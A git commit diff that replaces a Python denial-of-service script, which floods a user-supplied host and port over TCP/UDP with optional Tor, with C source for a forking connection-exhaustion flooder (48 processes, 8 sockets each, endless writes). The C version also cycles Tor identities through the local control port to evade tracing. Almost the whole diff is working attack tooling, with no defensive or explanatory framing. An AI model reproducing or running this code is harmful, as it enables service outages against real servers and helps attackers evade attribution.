cbe9239a41e0d59690fc2bcdb121cf53219ee225
Moment-ag <67823105+Moment-ag@users.noreply.github.com>
2020-07-06 15:28:17 +0700

    Update wkatk.py

--- wkatk.py
+++ wkatk.py
@@ -1,78 +1,98 @@
-import socket
-import threading
-import time
-from datetime import datetime
-
-class DoS:
-	def __init__(self, host, port, nThreads, UseTor):
-		self.host = host
-		self.port = port
-		self.nThreads = nThreads
-		self.UseTor = UseTor
-		self.TPS = 0
-		self.Delimiter = 2000
-
-		self.threads = []
-
-		self.message = '-------= DoS Attack =-------'
-
-	def SendAttack(self):
-
-		if self.UseTor:
-			s = socks.socksocket()
-			
-		else:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-		try:
-			s.connect((self.host, self.port))
-			s.send(self.message) # TCP Attack
-			s.sendto(self.message, (self.host, self.port)) # UDP Attack
-			self.TPS -= 1
-		except socket.error:
-			pass
-
-		s.close()
-
-	def Attack(self):
-
-		for i in range(self.nThreads):
-			t = threading.Thread(target = self.SendAttack)
-			self.threads.append(t)
-
-		for i in self.threads:
-			i.start()
-
-			while self.TPS >= self.Delimiter:
-				pass
-
-			self.TPS += 1
-
-		for i in self.threads:
-			i.join()
-
-Tor = input('[?] Did you want to use Tor (S/N): ').lower()
-host = input('[*] Enter Target Host Address: ')
-port = int(input('[*] Enter Target Port to Attack: '))
-threads = int(input('[*] Enter number of Attacks: '))
-
-UseTor = False
-
-if Tor == 's':
-	UseTor = True
-
-hostip = socket.gethostbyname(host)
-
-DoS = DoS(host, port, threads, UseTor)
-
-print('\nHost %s ... IP %s' % (host, hostip))
-print('\n\n[*] Starting The Attack At %s...' % (time.strftime("%H:%M:%S")))
-start_time = datetime.now()
-
-DoS.Attack()
-
-end_time = datetime.now()
-total_time = end_time - start_time
-
-print('\n[*] The Attack Was Done At %s...' % (time.strftime("%H:%M:%S")))
-print('[*] Total Attack Time %s...' % (total_time))
+#include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <stdint.h>
+    #include <unistd.h>
+    #include <netdb.h>
+    #include <signal.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <netinet/in.h>
+    #include <arpa/inet.h>
+     
+    int make_socket(char *host, char *port) {
+            struct addrinfo hints, *servinfo, *p;
+            int sock, r;
+    //      fprintf(stderr, "[เชื่อมต่อแล้ว -> %s:%s\n", host, port);
+            memset(&hints, 0, sizeof(hints));
+            hints.ai_family = AF_UNSPEC;
+            hints.ai_socktype = SOCK_STREAM;
+            if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
+                    fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
+                    exit(0);
+            }
+            for(p = servinfo; p != NULL; p = p->ai_next) {
+                    if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
+                            continue;
+                    }
+                    if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
+                            close(sock);
+                            continue;
+                    }
+                    break;
+            }
+            if(p == NULL) {
+                    if(servinfo)
+                            freeaddrinfo(servinfo);
+                    fprintf(stderr, "ไม่มีการเชื่อมต่อ\n");
+                    exit(0);
+            }
+            if(servinfo)
+                    freeaddrinfo(servinfo);
+            fprintf(stderr, "[เชื่อมต่อแล้ว -> %s:%s]\n", host, port);
+            return sock;
+    }
+     
+    void broke(int s) {
+            // do nothing
+    }
+     
+    #define CONNECTIONS 8
+    #define THREADS 48
+     
+    void attack(char *host, char *port, int id) {
+            int sockets[CONNECTIONS];
+            int x, g=1, r;
+            for(x=0; x!= CONNECTIONS; x++)
+                    sockets[x]=0;
+            signal(SIGPIPE, &broke);
+            while(1) {
+                    for(x=0; x != CONNECTIONS; x++) {
+                            if(sockets[x] == 0)
+                                    sockets[x] = make_socket(host, port);
+                            r=write(sockets[x], "\0", 1);
+                            if(r == -1) {
+                                    close(sockets[x]);
+                                    sockets[x] = make_socket(host, port);
+                            } else
+    //                              fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
+                            fprintf(stderr, "[%i: ส่ง Voly]\n", id);
+                    }
+                    fprintf(stderr, "[%i: ส่ง Voly]\n", id);
+                    usleep(300000);
+            }
+    }
+     
+    void cycle_identity() {
+            int r;
+            int socket = make_socket("localhost", "9050");
+            write(socket, "AUTHENTICATE \"\"\n", 16);
+            while(1) {
+                    r=write(socket, "signal NEWNYM\n\x00", 16);
+                    fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
+                    usleep(300000);
+            }
+    }
+     
+    int main(int argc, char **argv) {
+            int x;
+            if(argc !=3)
+                    cycle_identity();
+            for(x=0; x != THREADS; x++) {
+                    if(fork())
+                            attack(argv[1], argv[2], x);
+                    usleep(200000);
+            }
+            getc(stdin);
+            return 0;
+    }
